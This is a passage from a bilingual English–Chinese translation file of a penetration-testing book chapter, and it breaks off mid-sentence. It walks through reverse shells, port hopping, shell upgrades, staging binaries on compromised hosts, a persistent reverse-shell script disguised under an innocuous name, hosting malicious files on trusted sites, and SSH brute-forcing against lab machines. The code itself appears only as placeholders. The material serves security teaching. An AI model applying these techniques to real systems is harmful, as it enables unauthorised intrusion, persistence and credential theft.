  zh: 在被攻陷的机器上，以下命令将建立一个加密的反向 Shell。然而，被攻陷的机器必须已安装 Ncat 才能使此命令生效，而它通常默认并不可用：
- en: '[PRE11]'
  id: totrans-106
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: In this example, we run Ncat to connect to the attacker’s listener. We use --ssl
    to encrypt the traffic, followed by -e /bin/bash to execute the bash shell.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们运行 Ncat 连接到攻击者的监听器。我们使用 --ssl 来加密流量，然后使用 -e /bin/bash 来执行 bash shell。
- en: pwncat can also establish a connection over SSL by using the same command style
    as Ncat. Refer to pwncat’s documentation at *[https://pwncat.readthedocs.io/en/latest/usage.html](https://pwncat.readthedocs.io/en/latest/usage.html)*
    to learn how to use it for establishing SSL-based reverse shell connections.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: pwncat 也可以通过使用与 Ncat 相同的命令风格，建立基于 SSL 的连接。请参考 pwncat 的文档 *[https://pwncat.readthedocs.io/en/latest/usage.html](https://pwncat.readthedocs.io/en/latest/usage.html)*
    了解如何使用它来建立基于 SSL 的反向 Shell 连接。
- en: Alternating Between Destination Ports
  id: totrans-109
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 在目标端口之间切换
- en: '*Port hopping*, or dynamically switching network ports during the communication
    process, is used for both defensive and offensive activities. On the offensive
    side, this technique can ensure the stability of a reverse shell and make it more
    challenging for security monitoring systems to block malicious traffic. By constantly
    changing ports, attackers can bypass simple port-based filtering mechanisms and
    intrusion detection systems that monitor specific ports for suspicious activities.
    Port hopping also makes it more difficult for defenders to thwart the reverse
    shell connection; if a network port becomes unreachable, a port hop will reestablish
    the connection.'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: '*端口跳跃*，或在通信过程中动态切换网络端口，既用于防御活动也用于进攻活动。在进攻方面，这种技术可以确保反向 Shell 的稳定性，并使安全监控系统更难以阻止恶意流量。通过不断更换端口，攻击者可以绕过简单的基于端口的过滤机制和入侵检测系统，这些系统监控特定端口以检测可疑活动。端口跳跃还使防御者更难以阻止反向
    Shell 连接；如果某个网络端口变得不可达，端口跳跃会重新建立连接。'
- en: NOTE
  id: totrans-111
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 注意
- en: '*You can download this chapter’s scripts from* [https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07](https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07).'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '*你可以从以下链接下载本章的脚本*：[https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07](https://github.com/dolevf/Black-Hat-Bash/blob/master/ch07)。'
- en: Attackers typically implement port hopping by using a predefined range of ports.
    [Listing 7-3](chapter7.xhtml#Lis7-3) performs a reverse shell connection to the
    attacker machine by using a variety of ports, depending on their availability.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者通常通过使用预定义的端口范围来实现端口跳跃。[列表 7-3](chapter7.xhtml#Lis7-3) 通过使用多个端口执行反向 Shell
    连接，具体取决于端口的可用性。
- en: port-hopper.sh
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: port-hopper.sh
- en: '[PRE12]'
  id: totrans-115
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'Listing 7-3: Attempting reverse shell connections using a variety of ports'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 7-3：使用多种端口尝试反向 Shell 连接
- en: 'This script sets a few predefined ports in an array: 34455, 34456, 34457, 34458,
    and 34459 ❶. At ❸, an infinite while loop continuously attempts to connect to
    the listener. We then iterate through the ports by using a for loop and check
    whether each port is reachable by using the listener_is_reachable() function ❹,
    which uses the special */dev/tcp* device. Notice that we prepend the reachability
    check ❷ with the timeout command to ensure that the command exits at a set interval
    of 0.5 seconds. If the port is reachable, we call the connect_reverse_shell()
    function, passing the open port as an argument, and send an interactive shell
    to it using */dev/tcp*.'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 该脚本在一个数组中设置了几个预定义的端口：34455、34456、34457、34458 和 34459 ❶。在 ❸ 处，一个无限的 while 循环会持续尝试连接监听器。然后，我们通过使用
    for 循环遍历端口，并使用 listener_is_reachable() 函数 ❹ 检查每个端口是否可达，该函数使用特殊的 */dev/tcp* 设备。请注意，我们在检查可达性时
    ❷ 会先使用 timeout 命令，确保命令在设定的 0.5 秒间隔内退出。如果端口可达，我们调用 connect_reverse_shell() 函数，传入打开的端口作为参数，并使用
    */dev/tcp* 向其发送交互式 shell。
- en: 'As we’re performing multiple network connections consecutively (one for the
    connectivity check and another to establish the reverse shell), some versions
    of Netcat may not support keeping the listener alive. To overcome this, we can
    use socat to set up a TCP listener on the Kali box. This tool will ensure that
    the listener remains alive:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们正在连续进行多个网络连接（一个用于连接检查，另一个用于建立反向 shell），某些版本的 Netcat 可能不支持保持监听器的存活。为了克服这一点，我们可以使用
    socat 在 Kali 主机上设置 TCP 监听器。该工具将确保监听器保持活跃：
- en: '[PRE13]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'If you run the script on one of the compromised hosts, such as *p-web-01* (172.16.10.10),
    it should yield the following output:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在其中一台受控主机上运行该脚本，如 *p-web-01*（172.16.10.10），它应该会产生以下输出：
- en: '[PRE14]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: In the next section, we’ll discuss a few methods we can use to stage new binaries
    into a target environment without the superuser privileges necessary to download
    official packages from public repositories.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一部分，我们将讨论几种方法，帮助我们在没有超级用户权限的情况下，将新的二进制文件传输到目标环境，而不需要从公共仓库下载官方软件包。
- en: Spawning TTY Shells with Pseudo-terminal Devices
  id: totrans-123
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用伪终端设备生成 TTY Shell
- en: 'Here’s another scenario you might encounter in future shell-popping adventures:
    the limited shell you have access to might not provide full TTY (terminal) support.
    Non-TTY shells have limited command line editing, no job control, incomplete output
    formatting, and missing signal handling, and they may not work in interactive
    applications such as text editors.'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有一个你可能在未来的 shell 破解冒险中遇到的场景：你访问的受限 shell 可能不提供完整的 TTY（终端）支持。非 TTY shell 具有有限的命令行编辑、没有作业控制、输出格式不完整和缺失信号处理，并且它们可能无法在交互式应用程序中工作，如文本编辑器。
- en: One common approach to upgrading a shell to a feature-rich TTY one is by using
    pseudo-terminals. A *pseudo-terminal* provides an interface through which processes
    can interact with a terminal-like device, allowing terminal-based applications,
    shells, and other programs to operate as if they were connected to a physical
    terminal.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 升级 shell 为功能丰富的 TTY shell 的一种常见方法是使用伪终端。*伪终端* 提供了一个接口，允许进程与类似终端的设备进行交互，从而使终端应用程序、shell
    和其他程序能够像连接到物理终端一样工作。
- en: Python’s pty Module
  id: totrans-126
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Python 的 pty 模块
- en: 'The Python pty module emulates the functionality of a physical terminal device.
    In the following example, we upgrade a Python shell to a fully interactive TTY
    bash shell by using the pty.spawn() function. Try running this on the Kali host
    to see what it does:'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: Python 的 pty 模块模拟物理终端设备的功能。在以下示例中，我们通过使用 pty.spawn() 函数，将 Python shell 升级为完全交互的
    TTY bash shell。尝试在 Kali 主机上运行它，看看它的效果：
- en: '[PRE15]'
  id: totrans-128
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: To exit the Python console, enter exit().
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 要退出 Python 控制台，输入 exit()。
- en: 'On a compromised host with Python installed, you could elevate your shell by
    executing the following command:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 在安装了 Python 的受控主机上，你可以通过执行以下命令来提升你的 shell 权限：
- en: '[PRE16]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: Keep in mind that Python must be available on the compromised host for this
    technique to work.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，Python 必须在受控主机上可用，才能使用此技术。
- en: socat
  id: totrans-133
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: socat
- en: You can use socat to spawn a TTY shell if the tool exists on the target and
    in your local hacking system. We generally use socat for bidirectional communications
    between two data channels.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 如果目标主机和你的本地攻击系统上都存在 socat 工具，你可以使用它来生成 TTY shell。我们通常使用 socat 在两个数据通道之间进行双向通信。
- en: 'On Kali, run the socat command to spawn a TTY shell:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Kali 上，运行 socat 命令以生成 TTY shell：
- en: '[PRE17]'
  id: totrans-136
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'The file: parameter uses the value of the $(tty) command, which expands to
    /dev/pts/#. Raw mode (raw) ensures that socat won’t process input and output data,
    echo=0 disables socat’s local echoing, and tcp-listen:1337 defines the local TCP
    listening port.'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 'file: 参数使用 $(tty) 命令的值，扩展为 /dev/pts/#。原始模式（raw）确保 socat 不会处理输入和输出数据，echo=0
    禁用 socat 的本地回显，tcp-listen:1337 定义本地 TCP 监听端口。'
- en: 'Next, by using the OS command injection vulnerability on *p-web-02* (172.16.10.12),
    execute the following command. Note the use of the pipe character to trigger the
    injection vulnerability:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，通过在*p-web-02*（172.16.10.12）上利用操作系统命令注入漏洞，执行以下命令。请注意使用管道符触发注入漏洞：
- en: '[PRE18]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: In this example, we call socat with the exec parameter 'bash -li', which will
    execute bash interactively as if it had been invoked as a login shell. We also
    pass pty,stderr to generate a pseudo-terminal and capture the standard error stream,
    followed by tcp:172.16.10.1:1337 to set the connection address using TCP.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 在此示例中，我们使用 exec 参数“bash -li”调用 socat，这将以交互方式执行 bash，就像它被作为登录 shell 调用一样。我们还传递了
    pty,stderr 来生成伪终端并捕获标准错误流，后跟 tcp:172.16.10.1:1337 来设置使用 TCP 的连接地址。
- en: Post-exploitation Binary Staging
  id: totrans-141
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 后期利用二进制文件部署
- en: Let’s discuss a few ways to upgrade from a limited shell environment without
    needing root-level access. In this section, we’ll assume we weren’t able to use
    bash alone to establish a reverse shell connection to *p-web-02* through the */dev/tcp*
    special pseudo-device file.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们讨论几种不需要 root 权限即可从受限 shell 环境升级的方法。在本节中，我们假设未能仅使用 bash 通过 */dev/tcp* 特殊伪设备文件建立反向
    shell 连接到*p-web-02*。
- en: Even if the *www-data* user lacks permissions and the ability to install software
    on the server, we can use bash alone to execute many attacks. However, missing
    certain core binaries, especially those used for networking, can make our hacker
    lives especially tough.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 即使 *www-data* 用户缺乏权限并且无法在服务器上安装软件，我们也可以仅使用 bash 执行许多攻击。然而，缺少某些核心二进制文件，尤其是那些用于网络的二进制文件，会使我们的黑客工作变得特别困难。
- en: 'As we noted in [Table 7-1](chapter7.xhtml#tab7-1), *p-web-02* doesn’t have
    the wget binary available for downloading files from remote servers. Let’s try
    to execute a few other common network utility commands to see whether they exist:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在[表 7-1](chapter7.xhtml#tab7-1)中提到的，*p-web-02* 没有 wget 二进制文件来从远程服务器下载文件。让我们尝试执行一些其他常见的网络工具命令，看看它们是否存在：
- en: '[PRE19]'
  id: totrans-145
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: Wow, this host really has no way to establish an outbound connection. We do
    have curl, but it isn’t possible to use curl to make direct reverse shell connections.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 哇，这台主机确实无法建立出站连接。我们有 curl，但是无法使用 curl 直接建立反向 shell 连接。
- en: In cases such as these, downloading a Netcat binary to the target server would
    come in handy. By taking advantage of application vulnerabilities such as code
    execution, we could potentially install such a networking utility, then use it
    to establish an upgraded reverse shell connection.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，下载一个 Netcat 二进制文件到目标服务器会非常有用。通过利用如代码执行等应用程序漏洞，我们可以潜在地安装这样的网络工具，并使用它建立升级版的反向
    shell 连接。
- en: In this section, we cover helpful commands we could use to pull network binaries
    into our target environments and execute them. Note that we’ll use our reverse
    shell connection with *p-web-02* to cheat a little here, but the following techniques
    could very well be executed using the OS command injection vulnerability we uncovered.
    We’ll demonstrate its use in a few examples.
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 本节中，我们涵盖了可以用来将网络二进制文件拉入目标环境并执行它们的有用命令。请注意，我们将使用与*p-web-02*的反向 shell 连接在这里稍微作弊一下，但以下技术完全可以利用我们发现的操作系统命令注入漏洞来执行。我们将在几个示例中展示它的使用。
- en: Serving Netcat
  id: totrans-149
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提供 Netcat 服务
- en: 'In your Kali machine, navigate to the directory of the payload you want to
    transfer, then enter the following Python command to stand up an HTTP server:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Kali 机器中，导航到您要传输的有效载荷的目录，然后输入以下 Python 命令来启动 HTTP 服务器：
- en: '[PRE20]'
  id: totrans-151
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 'On *p-web-02* (172.16.10.12), you should now be able to access the filesystem
    of your Kali machine through the Python HTTP server and execute a download command
    by using curl. Place a copy of the Kali nc binary into the same directory as the
    HTTP server:'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 在*p-web-02*（172.16.10.12）上，您现在应该能够通过 Python HTTP 服务器访问 Kali 机器的文件系统，并使用 curl
    执行下载命令。将 Kali nc 二进制文件的副本放入与 HTTP 服务器相同的目录中：
- en: '[PRE21]'
  id: totrans-153
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'You can now download it to *p-web-02* by using a remote curl command and set
    it as an executable:'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 您现在可以通过远程 curl 命令将其下载到*p-web-02*，并将其设置为可执行文件：
- en: '[PRE22]'
  id: totrans-155
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'Within the Kali machine, we can now establish a secondary reverse shell connection
    in a new terminal on a different port. Let’s choose 1234 (as our first reverse
    shell uses port 1337):'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Kali 虚拟机中，我们现在可以在新终端上通过不同的端口建立第二个反向 shell 连接。我们选择 1234 端口（因为第一个反向 shell 使用的是端口
    1337）：
- en: '[PRE23]'
  id: totrans-157
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'Next, we can execute the new nc binary from within the first reverse shell
    to establish a second one via nc. We can also send this process to the background
    by using &:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们可以在第一个反向 shell 中执行新的 nc 二进制文件，通过 nc 建立第二个反向 shell。我们还可以通过使用 & 将此过程发送到后台：
- en: '[PRE24]'
  id: totrans-159
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'Alternatively, we simply call the Netcat binary in *p-web-02* from within a
    new Kali terminal by using curl to exploit the OS command injection vulnerability:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 另外，我们可以简单地在新的 Kali 终端中通过 curl 调用 *p-web-02* 上的 Netcat 二进制文件，利用操作系统命令注入漏洞：
- en: '[PRE25]'
  id: totrans-161
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: This approach bypasses the need for the first reverse shell.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 这种方法绕过了第一个反向 shell 的需求。
- en: Uploading Files with pwncat
  id: totrans-163
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 pwncat 上传文件
- en: 'When we use pwncat to establish a shell, we can leverage its upload command
    to transfer files between the attacker and compromised target machines. The upload
    command accepts two arguments, the source file and its destination:'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们使用 pwncat 建立一个 shell 时，可以利用其上传命令在攻击者和受感染目标机器之间传输文件。上传命令接受两个参数，源文件和目标位置：
- en: '[PRE26]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: It’s important to remember that, unless pwncat is using SSL, the traffic between
    the attacker’s machine and the target will be in cleartext. (The same is true
    for Netcat and Ncat.)
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 重要的是要记住，除非 pwncat 使用 SSL，否则攻击者机器与目标机器之间的流量将是明文传输。（Netcat 和 Ncat 也是如此。）
- en: Downloading Binaries from Trusted Sites
  id: totrans-167
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 从可信网站下载二进制文件
- en: Often, environments won’t block egress traffic made to commonly used websites
    such as GitHub, GitLab, Google Drive, and Microsoft OneDrive, as well as to cloud
    services like Amazon Simple Storage Service (S3) and Google Cloud Storage (GCS).
    Thus, these are great places to host malicious files.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，环境不会阻止与常用网站（如 GitHub、GitLab、Google Drive 和 Microsoft OneDrive）以及云服务（如亚马逊简单存储服务
    S3 和 Google 云存储 GCS）的外发流量。因此，这些是托管恶意文件的好地方。
- en: Organizations with less security maturity frequently use the same outbound filtering
    policies for their entire network (including users and servers alike), and there
    is often no great way to block one part of a website while allowing others. In
    addition, if a company uses Amazon Web Services (AWS) or any other cloud provider
    to host its infrastructure, there is a good chance it allows all traffic to and
    from the cloud provider.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 安全性成熟度较低的组织通常会对其整个网络（包括用户和服务器）使用相同的出站过滤策略，并且往往没有很好的方法来阻止网站的某一部分，同时允许其他部分通过。此外，如果公司使用亚马逊
    Web 服务（AWS）或任何其他云服务商来托管其基础设施，很可能会允许与云服务提供商之间的所有流量。
- en: As a penetration tester, you should explore any third-party services used by
    your target and look for ways to host your malicious files from them. For instance,
    if your target has a public marketing website and offers a chatbot feature for
    speaking with an agent, there might be a way to anonymously attach files through
    the chat. If this is the case, you could copy and paste that link and use it to
    pull malicious files onto compromised hosts down the road.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试员，你应该探索目标使用的任何第三方服务，并寻找方法通过它们托管你的恶意文件。例如，如果你的目标有一个公共的营销网站，并且提供与代理对话的聊天机器人功能，可能有办法通过聊天匿名附加文件。如果是这种情况，你可以复制并粘贴该链接，用它将恶意文件传输到后续受感染的主机。
- en: One benefit to the trusted-site hosting approach is that if a website is served
    over HyperText Transfer Protocol Secure (HTTPS), communications between the compromised
    machine and the trusted site will be encrypted automatically.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 通过可信网站托管的一个好处是，如果网站通过安全超文本传输协议（HTTPS）提供，受感染的机器与可信网站之间的通信将自动加密。
- en: 'Exercise 10: Maintaining a Continuous Reverse Shell Connection'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 练习 10：保持持续的反向 Shell 连接
- en: You might want to strengthen your initial foothold on your target by executing
    a script that continuously reestablishes a reverse shell connection. If the reverse
    shell process is ever interrupted or disconnected, your script could reestablish
    a connection with the Kali machine by using the IP address and port you provide.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能想通过执行一个脚本来加强你在目标上的初始立足点，该脚本会不断重新建立反向 shell 连接。如果反向 shell 进程被中断或断开，你的脚本可以通过提供的
    IP 地址和端口重新连接到 Kali 虚拟机。
- en: '[Listing 7-4](chapter7.xhtml#Lis7-4) will run locally as a background process
    on the compromised server and attempt to reestablish the reverse shell connection
    at a certain interval we set.'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: '[清单 7-4](chapter7.xhtml#Lis7-4)将在被攻陷的服务器上作为后台进程本地运行，并尝试以我们设置的特定间隔重新建立反向 shell
    连接。'
- en: reverse_shell _monitor.sh
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: reverse_shell _monitor.sh
- en: '[PRE27]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'Listing 7-4: Monitoring and reestablishing a reverse shell'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 7-4：监控并重新建立反向 shell 连接
- en: 'The script itself is simple: we call the restart_reverse_shell() function every
    10 seconds. Regardless of the status of the network or reverse shell process,
    this function will attempt to reestablish a connection with our Kali host. The
    Kali machine will refuse any additional connections if a current reverse shell
    connection is ongoing.'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本本身很简单：我们每 10 秒调用一次 restart_reverse_shell() 函数。无论网络或反向 shell 进程的状态如何，该函数都会尝试与我们的
    Kali 主机重新建立连接。如果当前已经有一个反向 shell 连接，Kali 主机会拒绝任何其他连接。
- en: 'Name the script something generic, like *donation-monitor.sh*, to avoid suspicion,
    as the script should run in the background indefinitely. Next, save the script
    to a file on *p-web-02* (172.16.10.12) and set the appropriate execution permission,
    then run the script as a background job, redirecting its output:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 将脚本命名为一些普通的名称，比如 *donation-monitor.sh*，以避免引起怀疑，因为该脚本应在后台无限期运行。接下来，将脚本保存到 *p-web-02*（172.16.10.12）上的文件中，并设置适当的执行权限，然后将脚本作为后台任务运行，重定向其输出：
- en: '[PRE28]'
  id: totrans-180
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: To test the script, all you need to do is run the Netcat listener command to
    serve the reverse shell. Attempt to stop and start the listener multiple times,
    and notice that the reverse shell is reestablished every 10 seconds.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 要测试脚本，您只需要运行 Netcat 监听命令以提供反向 shell。尝试多次停止和启动监听器，您会注意到每 10 秒反向 shell 会重新建立连接。
- en: Initial Access with Brute Force
  id: totrans-182
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用暴力破解进行初始访问
- en: A more traditional way of entering a remote system is by using the same services
    an IT administrator would use. By leveraging stolen credentials or exploiting
    weaknesses such as misconfigurations or poor passwords, we can brute-force a path
    through a system’s front door.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 进入远程系统的一种更传统方式是使用与 IT 管理员相同的服务。通过利用被盗的凭证或利用如配置错误或密码不强等弱点，我们可以通过暴力破解的方式打开系统的大门。
- en: One common service to target is SSH. While generally considered a secure protocol,
    SSH implementations may have security weaknesses that attackers could exploit,
    such as poor or reused passwords, insecure authentication methods, and key management
    issues.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 一个常见的目标服务是 SSH。虽然一般认为 SSH 是一种安全协议，但其实现可能存在安全弱点，攻击者可以利用这些弱点进行攻击，例如密码弱或重复使用、身份验证方法不安全以及密钥管理问题。
- en: We can use bash scripting to perform complex brute-force attacks across numerous
    service protocols, including SSH. While we could run individual brute-forcing
    tools in isolation, combining them in a bash script provides numerous benefits.
    Our scripts can automate host detection, generate wordlists, and integrate with
    tools to stuff credentials.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用 bash 脚本执行跨多个服务协议的复杂暴力攻击，包括 SSH。虽然我们可以单独运行暴力破解工具，但将它们结合到一个 bash 脚本中可以带来许多好处。我们的脚本可以自动化主机检测、生成字典文件，并与工具集成来填充凭证。
- en: 'Let’s try to break into a new target, the *p-jumbox-01* server (172.16.10.13).
    To execute an SSH connection, open a new terminal from within the Kali machine
    and enter the following command:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们尝试破解一个新目标，*p-jumbox-01* 服务器（172.16.10.13）。要执行 SSH 连接，请在 Kali 主机中打开一个新终端并输入以下命令：
- en: '[PRE29]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: The warning message you see after attempting to SSH into *p-jumpbox-01* indicates
    that the SSH client does not have the host’s public key stored in its *known_hosts*
    file. This file is used to verify the authenticity of the host you are connecting
    to, and the *ED25519 key fingerprint* represents the server’s public key. By entering
    yes, we proceed with the SSH connection and place the host’s public key into our
    *known_hosts* file.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试通过 SSH 连接到 *p-jumpbox-01* 后，您看到的警告信息表示 SSH 客户端没有将主机的公钥存储在 *known_hosts* 文件中。此文件用于验证您正在连接的主机的真实性，而
    *ED25519 密钥指纹* 表示服务器的公钥。通过输入 yes，我们继续进行 SSH 连接，并将主机的公钥存入我们的 *known_hosts* 文件中。
- en: SSH allows both password-based and key-based authentication. In *password-based
    authentication*, a user provides their username and password to authenticate themselves
    to the remote server. In *key-based authentication* (also known as *public-key
    authentication*), a user supplies a cryptographic key to authenticate to a server.
    Before attempting to brute-force an SSH server, it’s important to verify that
    the server accepts password-based authentication.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: SSH允许基于密码和基于密钥的认证。在*基于密码的认证*中，用户提供其用户名和密码来验证自己的身份以访问远程服务器。在*基于密钥的认证*（也称为*公钥认证*）中，用户提供一个加密密钥来验证自己的身份。在尝试暴力破解SSH服务器之前，验证服务器是否接受基于密码的认证非常重要。
- en: To test whether a server allows password-based authentication, simply observe
    the server’s response after attempting an initial connection. For example, you
    can see that our initial connection attempt yielded a prompt for the user’s password.
    Alternatively, you can use Nmap’s built-in NSE script *ssh-auth-methods.nse* located
    at */usr/share/nmap/scripts*.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 要测试服务器是否允许基于密码的认证，只需观察在尝试初始连接后服务器的响应。例如，您可以看到我们的初始连接尝试产生了对用户密码的提示。或者，您可以使用Nmap位于*/usr/share/nmap/scripts*下的内置NSE脚本*ssh-auth-methods.nse*。
- en: If the server immediately rejects the connection or provides a generic error
    message without prompting you for a password, password-based authentication may
    not be allowed or isn’t the server’s primary authentication method.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 如果服务器立即拒绝连接或者提供了一个通用的错误消息而不提示您输入密码，那么可能不允许基于密码的认证或者这不是服务器的主要认证方法。
- en: 'Exercise 11: Brute-Forcing an SSH Server'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 练习11：对SSH服务器进行暴力破解
- en: In this exercise, you’ll use bash to conduct a dictionary-based brute-force
    attack against the SSH service running on the *p-jumpbox-01* (172.16.10.13) server.
    Your script should iterate through a list of common usernames and passwords, attempt
    to authenticate to the server, and log any successful credentials.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个练习中，您将使用bash对运行在*p-jumpbox-01*（172.16.10.13）服务器上的SSH服务进行基于字典的暴力破解攻击。您的脚本应该迭代常见用户名和密码的列表，尝试对服务器进行身份验证，并记录任何成功的凭据。
- en: Before writing the SSH brute-forcing script, you’ll need two things. First,
    you must either identify a single target username or generate a list of usernames
    to iterate through. You didn’t identify any usernames during reconnaissance, so
    try a list of common Linux usernames, such as *root*, *guest*, *backup*, *ubuntu*,
    and *centos*. Of course, you’re merely guessing that these users exist on the
    target server.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 在编写SSH暴力破解脚本之前，您需要两样东西。首先，您必须识别单个目标用户名或生成一个用户名列表进行迭代。在侦察期间没有识别到任何用户名，因此尝试使用常见的Linux用户名列表，如*root*、*guest*、*backup*、*ubuntu*和*centos*。当然，这只是猜测这些用户是否存在于目标服务器上。
- en: Second, you’ll need a list of potential passwords. Kali contains a great password
    list in the */usr/share/wordlist* directory, but we suggest instead using the
    *common-credentials/passwords.txt* password file from the book’s GitHub repository.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 其次，您需要一个潜在密码列表。Kali包含了一个在*/usr/share/wordlist*目录中的出色密码列表，但我们建议使用书籍GitHub仓库中的*common-credentials/passwords.txt*密码文件。
- en: Armed with your username and password lists, you can write some bash to test
    the strength of the *p-jumpbox-01* server’s authentication. [Listing 7-5](chapter7.xhtml#Lis7-5)
    provides an example.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 有了您的用户名和密码列表，您可以编写一些bash脚本来测试*p-jumpbox-01*服务器认证的强度。[第7-5节](chapter7.xhtml#Lis7-5)提供了一个示例。
- en: ssh-bruteforce.sh
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: ssh-bruteforce.sh
- en: '[PRE30]'
  id: totrans-198
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: 'Listing 7-5: Brute-forcing SSH'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 第7-5节：SSH暴力破解
- en: 'This SSH brute-force bash script starts much like our other scripts: by defining
    the target IP address and port. Next, we specify a list of usernames ❶ and a file
    that contains passwords that we’ll use ❷. At ❸, we then iterate through each username
    and use sshpass to inject passwords ❺, which we read in line by line ❹. We print
